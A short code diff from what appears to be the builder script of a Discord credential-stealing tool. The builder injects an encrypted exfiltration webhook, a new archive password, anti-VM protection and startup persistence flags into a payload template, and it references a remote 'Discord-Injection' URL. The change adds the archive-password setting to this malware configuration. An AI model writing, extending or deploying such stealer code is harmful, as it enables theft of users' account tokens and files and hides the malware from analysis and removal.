@@ -15,6 +15,7 @@ InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/m
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('"%webhook%"', EncryptString(settings["settings"]["webhook"]))
+    code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
     code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
     code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
     code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
